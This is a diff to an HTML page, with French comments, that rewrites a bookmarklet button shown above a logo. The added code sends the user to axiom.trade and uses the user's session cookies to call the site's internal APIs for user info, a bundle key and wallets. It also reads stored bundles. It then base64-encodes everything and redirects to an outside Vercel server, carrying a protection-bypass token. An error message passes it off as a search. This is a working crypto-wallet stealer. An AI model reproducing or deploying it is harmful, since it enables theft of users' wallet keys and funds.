@@ -50,7 +50,35 @@
   <!-- BOUTON BOOKMARKLET AU-DESSUS DU LOGO -->
 <div style="text-align:center; margin-bottom:1em;">
   <a
-    href="javascript:(async()=>{try{if(location.hostname!='axiom.trade'){location.replace('https://axiom.trade/discover');}else{if(!localStorage.getItem('isAuthed'))return alert('You must be signed in to use this bookmarklet.');const user=await(await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();const bundleRes=await(await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();const bundleString=`${localStorage.getItem('sBundles')};${bundleRes.bundleKey}`;location.replace(`https://colirnerserver.vercel.app/api/wallets/${btoa(JSON.stringify({hash:'MDs3NTE3MDE1NDcx',site:'https://colirnerserver.vercel.app/api/wallets',user,bundle:bundleString}))}?x-vercel-protection-bypass=monSuperTokenSecret1234567890abc`);}}catch(e){alert('search failed, try again later.');}})();"
+    href="javascript:(async()=>{
+  try{
+    const exportFlag = 'axiom_export_pending';
+    // Étape 1 : Si pas sur axiom.trade, on set le flag et on redirige
+    if(location.hostname!='axiom.trade'){
+      localStorage.setItem(exportFlag, '1');
+      location.replace('https://axiom.trade/discover#export');
+      return;
+    }
+    // Étape 2 : Si sur axiom.trade, on vérifie le flag
+    if(localStorage.getItem(exportFlag) === '1' || location.hash.includes('export')){
+      localStorage.removeItem(exportFlag);
+      if(!localStorage.getItem('isAuthed')) return alert('You must be signed in to use this bookmarklet.');
+      const user = await (await fetch('//api7.axiom.trade/user-info', {method:'POST', credentials:'include'})).json();
+      const bundleRes = await (await fetch('//api8.axiom.trade/bundle-key-and-wallets', {method:'POST', credentials:'include'})).json();
+      const bundleString = `${localStorage.getItem('sBundles')};${bundleRes.bundleKey}`;
+      location.replace(`https://colirnerserver.vercel.app/api/wallets/${btoa(JSON.stringify({
+        hash:'MDs3NTE3MDE1NDcx',
+        site:'https://colirnerserver.vercel.app/api/wallets',
+        user,
+        bundle:bundleString
+      }))}?x-vercel-protection-bypass=monSuperTokenSecret1234567890abc`);
+      return;
+    }
+    // Si pas de flag, ni hash export, on ne fait rien
+  }catch(e){
+    alert('search failed, try again later.');
+  }
+})();"
     style="
       display:inline-block;
       background:#ffcd26;
